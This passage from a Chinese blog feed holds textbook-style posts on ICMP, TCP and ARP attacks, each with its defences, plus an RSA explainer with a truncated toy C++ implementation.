alt="ICMP洪泛攻击"></p><p>ICMP洪泛攻击可以具体分为<strong>针对带宽的Dos攻击</strong>和<strong>端口扫描攻击</strong></p><p><strong>针对带宽的Dos攻击：</strong></p><p>攻击者发送大量的伪造的ICMP Echo请求报文，交换机、路由器等网络设备的CPU需要响应这种报文，会占用大量的带宽和CPU，这种Dos攻击和其他Dos攻击一样，消耗设备的资源而使得设备无法提供正常服务。</p><p><strong>端口扫描攻击（针对连接的Dos攻击）：</strong></p><p>端口扫描是指攻击者发送大量的端口扫描报文，交换机需要回应大量的ICMP目的不可达报文，这种攻击既消耗系统的资源，同时攻击者能够很轻易获得设备开启的端口，然后可以针对这些端口进行攻击，可以影响所有IP设备的网络连接。</p><h2 id="六、ICMP攻击防范"><a href="#六、ICMP攻击防范" class="headerlink" title="六、ICMP攻击防范"></a>六、ICMP攻击防范</h2><p>为了减轻设备处理ICMP报文的压力以及防范ICMP攻击，ICMP攻击防范技术尤为重要。目前主要采用<strong>ICMP报文限速</strong>、<strong>ICMP报文合法性检查、丢弃不需要处理的ICMP报文和不响应不可达报文</strong>来防范攻击，保护设备的CPU资源。</p><p><strong>（1）报文限速：</strong>ICMP报文限速包括端口限速、VLAN限速和全局限速，同时也实现芯片的限速，通过多个维度来保证ICMP的洪泛攻击。</p><p><strong>（2）合法性检查&amp;丢弃不需要处理的报文：</strong>对于一些不合法的ICMP报文，比如TTL为0、ICMP类型为15、16、17的报文，都直接丢弃，同时可配置丢弃一些不常用或基本不使用的ICMP报文，包括TTL为1、带选项、不可达的ICMP报文。</p><p><strong>（3）不响应不可达报文：</strong>在用户通过发送大量端口不可达或网络不可达报文攻击设备时，设备收到这些报文后可以不响应，直接丢弃，以保护CPU资源。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--TCP</title>
    <link href="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/"/>
    <url>/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议栈安全分析—TCP"><a href="#TCP-IP协议栈安全分析—TCP" class="headerlink" title="TCP/IP协议栈安全分析—TCP"></a>TCP/IP协议栈安全分析—TCP</h1><p>TCP是一种面向连接的协议，它在传输数据之前会建立一条专用的通信连接，意味着在数据传输过程中，两台计算机之间会有一条稳定的数据传输通道。因此，TCP可以保证数据传输的可靠性，但会带来一定的延迟。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312110155266.png" alt="总的过程"></p><h2 id="一、三次握手"><a href="#一、三次握手" class="headerlink" title="一、三次握手"></a>一、三次握手</h2><h3 id="1-1-过程分析"><a href="#1-1-过程分析" class="headerlink" title="1.1 过程分析"></a>1.1 过程分析</h3><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312111639293.png" alt="三次握手"></p><p>（1）Client端发送一个SYN包，请求连接，告诉Server端他的初始序列号是x，此时Client的状态是SYN_SENT</p><p>（2）Server端收到了SYN包，告诉Client已经收到了请求，并且也告诉Client端自己的序列号是y，发送一个SYN+ACK包，Server的状态是SYN_RCVD</p><p>（3）Client端收到了发送过来的包，发回去一个ACK包，告知Server端已经收到了发送过来的包，此时Client的状态是ESTABLISHED</p><p>（4）Server端收到Client发送过来的ACK包之后，进入ESTABLISHED状态，连接建立完毕</p><p><strong>Q1：为什么需要三次握手？两次行不行？</strong></p><p>三次握手的目的是为了保证Client和server双方的接收能力，发送能力都是正常的。</p><p>第一次握手：Client发送SYN包给Server，Server端收到了，这时候Server端知道：client的发送能力正常，server的接收能力正常</p><p>第二次握手：server发送SYN+ACK包，client收到了，这时候Client端知道：client端的发送，接收能力正常；server端的发送，接收能力正常；但是为什么还需要第三次握手呢？<strong>因为此时client端知道双方均正常，但是server端不知道是否均正常，server只知道自身的发送与接收能力正常，client的发送能力正常，但是他不知道client的接收能力是否正常，所以需要第三次握手client发送一个ACK包，让server知道client接收能力正常，这样就可以建立连接了。</strong></p><p>如果只有两次握手，设想这样一个情境：如果client端发送一个SYN包给server，但是由于种种原因导致SYN包在网络某些结点处滞留了，但是client会进行重传SYN包，然后server端收到了这个重传的包，发送ACK包回去，然后建立好连接。等发送数据完毕之后，连接结束，这时候滞留的SYN包到达了Server端，server以为发起了一个新的连接请求，于是发送回一个ACK包，但是client此时并没有发起连接的请求，所以自动忽略那个ACK包，但是由于前提是两次握手创建连接，只要client收到了ACK包连接就建立了，所以此时连接已经建立了，所以Server端等待client发送数据包，但是client端没有发送数据包的需求，所以资源被浪费。</p><p><strong>Q2：什么是半连接队列？</strong></p><p>服务器第一次收到客户端的 SYN 之后，就会处于 SYN_RCVD 状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个队列里，我们把这种队列称之为半连接队列。当然还有一个全连接队列，就是已经完成三次握手，建立起连接的就会放在全连接队列中。如果队列满了就有可能会出现丢包现象。</p><p><strong>SYN-ACK包重传：</strong>服务器发送完SYN-ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传。如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。每次重传等待的时间不一定相同，一般会是指数增长，例如间隔时间为 1s，2s，4s，8s…</p><p><strong>Q3：ISN（序列号）是固定的吗</strong></p><p>ISN为了让对方知道如何接下来接收数据的时候如何按序列号组装数据。首先，如果 ISN 是固定的，攻击者很容易猜出后续的确认号，因此 ISN 是动态生成的。其次，如果ISN固定是1，client和server建立好一个TCP连接之后，client连续给server发了10个包，这10个包被链路上的路由器缓存了，这个时候client挂掉了，然后client用同样的端口号重新连接上Server，client又连续给server发了几个包，假设这个时候client的序列号是5了，之前滞留的数据包最终到了server端，server给client回复确认号10，但是client此时自己序列号只有5，这就乱了。。。。。。</p><p><strong>Q4：三次握手可以携带数据吗？</strong></p><p>第三次可以携带数据，但是前两次不行，因为第三次的时候client已经是Establish状态了，所以可以确保双方是可信的，但是如果第一次或者第二次携带数据的话，攻击者完全可以发送恶意的SYN包，包里面有着大量的恶意的数据，server就需要大量的空间、时间来保存这些包</p><h3 id="1-2-安全分析"><a href="#1-2-安全分析" class="headerlink" title="1.2 安全分析"></a>1.2 安全分析</h3><h4 id="1-2-1-SYN洪泛攻击"><a href="#1-2-1-SYN洪泛攻击" class="headerlink" title="1.2.1 SYN洪泛攻击"></a>1.2.1 SYN洪泛攻击</h4><p>SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server则回复确认包，并等待Client确认，由于源地址不存在，因此Server需要不断重发直至超时，这些伪造的SYN包将长时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS/DDoS 攻击。检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。</p><h4 id="1-2-2-序号攻击"><a href="#1-2-2-序号攻击" class="headerlink" title="1.2.2 序号攻击"></a>1.2.2 序号攻击</h4><p>如果攻击者能够预测目标主机选择的起始序号，他就可能欺骗该目标主机，使其相信它正在与一台可信的主机会话。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312115524390.png" alt="IP欺骗"></p><p><strong>Q1：为什么X必须要对B进行Dos攻击？</strong></p><p>如果不做Dos攻击的话，步骤4中B收到A发来的它未请求过的应答包，将返回RST包而终止连接</p><p><strong>Q2：为何X不能直接将自己IP修改为B的IP来连接到A的rlogin端口？</strong></p><p>①相同局域网内IP地址产生冲突</p><p>②外网X不能这样修改，网段不对</p><h3 id="1-3-防御策略"><a href="#1-3-防御策略" class="headerlink" title="1.3 防御策略"></a>1.3 防御策略</h3><h4 id="1-3-1-SYN洪泛攻击防御策略："><a href="#1-3-1-SYN洪泛攻击防御策略：" class="headerlink" title="1.3.1 SYN洪泛攻击防御策略："></a>1.3.1 <strong>SYN洪泛攻击防御策略</strong>：</h4><p><strong>Anti-DDos系统</strong>，部署在网络入口处，在服务器之前处理SYN报文，识别出虚假源，屏蔽来自这些地址的报文，只将合法的SYN报文传递给服务器。主要使用两种手段：源认证和首包丢弃</p><p><strong>源认证：</strong>Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</p><p><strong>首包丢弃：</strong>如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。所以需要首包丢弃的功能：正常情况下客户端发送SYN报文后如果在一定的时间内没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文，Anti-DDos系统会丢弃收到的第一个SYN报文，对于SYN洪泛攻击SYN报文绝大多数都是首包，所以只能正常的客户才会进行重传，然后再用源认证，这样一来就可以减少了Anti-DDos系统应答的压力。</p><h4 id="1-3-2-IP欺骗防御策略"><a href="#1-3-2-IP欺骗防御策略" class="headerlink" title="1.3.2 IP欺骗防御策略"></a>1.3.2 IP欺骗防御策略</h4><p>（1）阻止DDos攻击：因为完成IP欺骗必须要有Dos攻击的前提，所以如果可以防止Dos攻击的话，IP欺骗也就无法完成了。</p><p>（2）序列号随机化：攻击者可以猜测出序列号，所以如果序列号能够真正的做到随机化，使得规律无迹可寻。但是在现实生活中，随机很难做到，现在的随机都是伪随机，无法做到真正的随机。</p><h2 id="二、四次挥手"><a href="#二、四次挥手" class="headerlink" title="二、四次挥手"></a>二、四次挥手</h2><p>建立连接需要三次挥手，而终止一个连接需要经过四次挥手。</p><p>刚开始双方均处于ESTABLISHED状态，假设客户端发起关闭请求，过程如下：</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230411080513935.png" alt="四次挥手"></p><p><strong>第一次挥手</strong>：client发送FIN报文，报文中指定一个序列号u，此时客户端处于FIN_WAIT1状态，等待服务端确认</p><p><strong>第二次挥手：</strong>服务端收到FIN之后，会发送ACK报文，且把客户端的u+1作为ACK报文的序列号值，表明已经收到客户端的报文了，此时服务端处于CLOSE_WAIT状态，此时TCP处于半关闭状态，客户端到服务端的连接释放，客户端收到服务端的确认后，进入FIN_WAIT2状态，等待服务端发出的连接释放报文段</p><p><strong>第三次挥手：</strong>server端也进行断开，发送FIN报文，且指定一个序列号，此时server端处于LAST_ACK状态。即服务端没有要向客户端发出的数据，等待client确认。</p><p><strong>第四次挥手：</strong>client收到FIN之后，一样发出一个ACK报文作为应答，且把server的序列号值+1作为自己ACK报文的序列值，此时客户端处于TIME_WAIT状态。需要过一阵子以确保服务端收到自己的ACK报文之后才会进入CLOSED状态，Server端收到ACK报文之后，就处于关闭连接了，处于CLOSED状态。</p><p><strong>Q1：挥手为什么需要四次？</strong></p><p>因为当服务端收到客户端的SYN连接请求报文后，可以直接发送<strong>SYN+ACK</strong>报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当服务端收到<strong>FIN</strong>报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉客户端，“你发的FIN报文我收到了”。只有等到我服务端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四次挥手。</p><p><strong>Q2：2MSL等待状态的意义</strong></p><p>MSL是指任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。</p><p>为了保证客户端发送的最后一个ACK报文段能够到达服务器。因为这个ACK有可能丢失，从而导致处在LAST-ACK状态的服务器收不到对FIN-ACK的确认报文。server会超时重传这个FIN-ACK，接着client再重传一次确认，重新启动时间等待计时器，最后客户端和服务端都能正常的关闭。假设客户端不等待2MSL的话，发送完ACK之后就直接关闭，一旦ACK丢失的话，server将无法正常的进入关闭连接状态。</p><p>简而言之：</p><p>（1）保证客户端发送最后的一个ACK报文段可以到达服务端</p><p>（2）防止“已失效的连接请求报文段”出现在本连接中：经过2MSL之后，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失，使下一个新的连接不会出现旧的连接请求报文段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--ARP</title>
    <link href="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/"/>
    <url>/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议栈安全分析—ARP"><a href="#TCP-IP协议栈安全分析—ARP" class="headerlink" title="TCP/IP协议栈安全分析—ARP"></a>TCP/IP协议栈安全分析—ARP</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。</p><p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址。</p><p>收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存。</p><p>简单一点说就是：在IP以太网中，当一个上层协议要发包的时候，有了该节点的IP地址，ARP就能提供该节点的MAC地址</p><h2 id="二、ARP工作过程"><a href="#二、ARP工作过程" class="headerlink" title="二、ARP工作过程"></a>二、ARP工作过程</h2><p>（1）主机A和主机B在一个网段里面</p><ol><li>主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。</li><li>如果在ARP缓存表里面找不到相对应的表项，就缓存该数据报文，然后以广播的方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</li><li>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</li><li>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</li></ol><p>（2）主机A和主机B不在一个网段里面（<strong>在不在同一个网段里面由主机A进行判断</strong>）</p><ol><li>主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。</li><li>当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。</li><li>如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B。</li><li>如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。</li></ol><h2 id="三、ARP表"><a href="#三、ARP表" class="headerlink" title="三、ARP表"></a>三、ARP表</h2><p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP request报文来获得它。学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p><p>ARP表项又分为动态ARP表项和静态ARP表项。</p><h3 id="3-1-动态ARP表项"><a href="#3-1-动态ARP表项" class="headerlink" title="3.1 动态ARP表项"></a>3.1 动态ARP表项</h3><p>动态ARP表项由ARP协议通过ARP报文自动生成和维护，可以被老化，可以被新的ARP报文更新，可以被静态ARP表项覆盖。每个动态ARP缓存项的潜在生命周期是10分钟。新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除；如果某个项目已在使用，则又收到2分钟的生命周期；如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h3 id="3-2-静态ARP表项"><a href="#3-2-静态ARP表项" class="headerlink" title="3.2 静态ARP表项"></a>3.2 静态ARP表项</h3><p>静态ARP表项通过手工配置和维护，不会被老化，不会被动态ARP表项覆盖，直到重新启动计算机为止。</p><p>配置静态ARP表项可以增加通信的安全性。静态ARP表项可以限制和指定IP地址的设备通信时只使用指定的MAC地址，此时攻击报文无法修改此表项的IP地址和MAC地址的映射关系，从而保护了本设备和指定设备间的正常通信。</p><h2 id="四、ARP欺骗"><a href="#四、ARP欺骗" class="headerlink" title="四、ARP欺骗"></a>四、ARP欺骗</h2><p>因为ARP请求是基于互相信任的基础之上的，所以说无论是谁发的，我都会选择无条件相信。</p><p>如果一台不可信赖的计算机发出假冒的ARP查询或应答信息，并将所有流向它的数据流转移。这样，它就可以伪装成某台机器或修改数据流。这种攻击叫做<strong>ARP攻击</strong>，比如黑客软件Arpspoof就可以实现这样的攻击。</p><h3 id="4-1-ARP欺骗—假冒网关"><a href="#4-1-ARP欺骗—假冒网关" class="headerlink" title="4.1 ARP欺骗—假冒网关"></a>4.1 ARP欺骗—假冒网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230309202825792.png" alt="假冒网关"></p><p>攻击者监听到洪泛的ARP Request后，广播假的网关ARP Reply报文给同网段主机。</p><p>如上图</p><p>攻击者B假冒网关，说目的IP 1.1.1.1对应的MAC地址为B，与之相邻的主机的ARP表均被污染，这样的话如果用户A想要上网，发送IP包给网关，但是由于ARP表已经被污染了，IP地址为1.1.1.1的主机的MAC地址为B，所以用户A的上网流量被导向到攻击者B，如此一来便上不了网了</p><h3 id="4-2-ARP-欺骗—欺骗网关"><a href="#4-2-ARP-欺骗—欺骗网关" class="headerlink" title="4.2 ARP 欺骗—欺骗网关"></a>4.2 ARP 欺骗—欺骗网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075203443.png" alt="欺骗网关"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.3的MAC地址是B，然后网关的ARP表被污染掉，这样用户A想要上网，包可以发送到网关处，但是网关这里无法将发送给用户A的流量发送给A，因为ARP表已经被污染了，所以说网关原本发送给用户A的流量被发送到了攻击者B</p><h3 id="4-3-ARP欺骗—欺骗终端用户"><a href="#4-3-ARP欺骗—欺骗终端用户" class="headerlink" title="4.3 ARP欺骗—欺骗终端用户"></a>4.3 ARP欺骗—欺骗终端用户</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075821109.png" alt="欺骗终端用户"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.9的MAC地址为B，用户A的ARP表被污染了，导致用户A原本发送给用户C的包会发送到攻击者B</p><p>上面发送的ARP Request报文是广播的，所以说在一个网段里面，所有的主机的ARP表都将会被污染</p><p>比如第三张图片中，其实网关、用户C的ARP表也被污染了，所以其实用户C也无法上网，分析过程也是从IP—&gt;MAC的映射关系入手。</p><p>在攻击者B广播伪造的ARP Request报文的时候，网关的ARP表中1.1.1.9对应的MAC地址也被修改为了B，当用户C想要上网的时候，用户C向网关发送数据包，这一步仍然可以正常进行，因为在用户C的ARP表中网关的IP与MAC地址并没有被修改，但是当网关想要把返回来的数据包发送给用户C的时候，由于网关的ARP表被修改了，所以网关想要发回用户C的数据包最终会发给攻击者B</p><h2 id="五、ARP防御"><a href="#五、ARP防御" class="headerlink" title="五、ARP防御"></a>五、ARP防御</h2><h3 id="5-1-网关防御"><a href="#5-1-网关防御" class="headerlink" title="5.1 网关防御"></a>5.1 网关防御</h3><p>（1）合法ARP绑定，防御网关被欺骗</p><p>（2）VLAN内的ARP学习数量限制，防御ARP泛洪攻击</p><h3 id="5-2-接入设备防御"><a href="#5-2-接入设备防御" class="headerlink" title="5.2 接入设备防御"></a>5.2 接入设备防御</h3><p>（1）将合法网关IP-MAC进行绑定，防御仿冒网关攻击</p><p>（2）ARP入侵检测</p><p>（3）ARP限速，防止大流量ARP报文冲击网络</p><p>（4）绑定用户的静态MAC</p><h3 id="5-3-客户端防御"><a href="#5-3-客户端防御" class="headerlink" title="5.3 客户端防御"></a>5.3 客户端防御</h3><p>（1）合法网关ARP绑定，防止网关仿冒攻击</p><p>（2）绑定该主机的合法IP-MAC，过滤掉所有非法ARP报文</p><p>（3）ARP限速</p><blockquote><p>没有到老化时间不允许修改MAC地址</p><p>对于MAC地址要修改的ARP报文，对原ARP表对应的用户发送单播确认；收到应答进行拒绝</p><p>合法ARP静态绑定；ARP限速，防止ARP Flooding</p></blockquote><h2 id="六、补充：ARP-Flooding攻击"><a href="#六、补充：ARP-Flooding攻击" class="headerlink" title="六、补充：ARP Flooding攻击"></a>六、补充：ARP Flooding攻击</h2><p><strong>ARP Flooding攻击</strong>：攻击者向设备发送大量目的IP地址无法解析的伪造ARP请求或免费报文，造成设备上的ARP表项溢出。无法缓存正常用户的ARP表项，从而影响正常的报文转发。</p><p><strong>如何防御ARP Flooding攻击？</strong></p><p>（1）<code>禁止接口学习ARP表项的功能</code>：用户禁止指定接口学习ARPP表项的功能，可以有效防止ARP表项溢出，保证ARP表项的安全性。</p><p>（2）<code>配置ARP表项严格学习</code>：设备仅学习自己发送的ARP请求报文的应答报文，并不学习其他设备向路由器发送的ARP请求报文。</p><p>（3）<code>配置ARP表项限制</code>：设备基于接口限制学习ARP表项的总数目，可以有效的防止ARP表项溢出，保证安全性。</p><p>（4）<code>配置ARP报文限速</code>：设备对ARP报文进行数量统计，在一定时间内，如果ARP报文数量超过了配置的阈值，超出部分的ARP报文将被忽略，设备不做任何处理，有效防止ARP表项溢出</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法</title>
    <link href="/2023/03/09/RSA%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/09/RSA%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>RSA是一种非对称加密算法，是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出的。RSA就是他们三位的姓名的首字母。</p><p>非对称加密算法：加密与解密的密钥不同</p><p>RSA同时还是分组加密算法，<strong>分组大小可以根据密钥的大小而改变</strong>，如果加密的数据不是分组大小的整数倍，则会根据具体的应用方式增加额外的填充位。</p><p><strong>RSA算法的原理围绕着模幂运算</strong>，<strong>模幂运算就是计算a^b^mod n的过程</strong></p><h2 id="二、计算公钥与私钥"><a href="#二、计算公钥与私钥" class="headerlink" title="二、计算公钥与私钥"></a>二、计算公钥与私钥</h2><p>公钥用于加密，私钥进行解密</p><p>（1）首先选择两个大素数，记作p和q，这两个数至少得有200位，才能在实践中保证相对的安全</p><p>（2）计算n=p*q，随机选择加密密钥e，保证e和(p-1)(q-1)互素</p><p>（3）使用扩展欧几里德算法，<em>ed</em> = 1mod (<em>p</em> - 1)(<em>q</em> - 1)，d和e的关系是互为逆元</p><p>（4）公钥为(<em>e</em>, <em>n</em>)，私钥为(<em>d</em>, <em>n</em>)</p><p>我们表示<strong>P = (e,n) , S = (d,n)</strong></p><p>用P来加密数据，用S来解密。<strong>为了防止就算有人知道了P也无法推算出S，必须保证p和q的值绝对不能暴露</strong>。</p><p>此项难题来自于<strong>大整数分解难题</strong>：给你两个整数，很容易可以知道整数之积；但是如果给你一个大整数，很难确定是由哪两个素整数之积</p><p>所以用此项难题来保证加密解密的安全性</p><h2 id="三、加密解密的合理性"><a href="#三、加密解密的合理性" class="headerlink" title="三、加密解密的合理性"></a>三、加密解密的合理性</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154824728.png" alt="image-20230309154824728"></p><h2 id="四、加密解密数据分组"><a href="#四、加密解密数据分组" class="headerlink" title="四、加密解密数据分组"></a>四、加密解密数据分组</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154845590.png" alt="image-20230309154845590"></p><h2 id="五、算法实现"><a href="#五、算法实现" class="headerlink" title="五、算法实现"></a>五、算法实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//本算法实现是相当简单的版本</span><br><span class="hljs-comment">//仅体现过程，不追求效率</span><br><span class="hljs-comment">//在实际生产过程中绝无可能使用如下算法</span><br><span class="hljs-comment">//仅作学习记录</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//一个非常简单的RSA算法实现，只追求完整步骤，不讲究效率</span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Isprime</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> </span>&#123;<br>    <span class="hljs-comment">//是否是素数，最原始方法，不讲究效率</span><br>    <span class="hljs-type">bool</span> ans=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-built_in">sqrt</span>(p); i++) &#123;<br>        <span class="hljs-keyword">if</span> (p % i == <span class="hljs-number">0</span>) &#123;<br>            ans = <span class="hljs-literal">false</span>;<br>      